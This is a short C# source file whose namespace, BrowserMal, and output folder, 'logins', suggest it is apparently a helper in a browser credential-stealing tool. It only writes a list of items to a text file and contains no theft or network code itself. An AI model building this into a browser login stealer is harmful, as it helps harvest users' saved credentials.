using System.Collections.Generic;
using System.Text;

namespace BrowserMal.File
{
    public class FileManager
    {
        public static void Save<T>(List<T> list, string outputPath)
        {
            StringBuilder stringBuilder = new StringBuilder();

            foreach (T item in list)
                stringBuilder.AppendLine(item.ToString());

            System.IO.File.WriteAllText(@"logins\" + outputPath, stringBuilder.ToString());
        }
    }
}
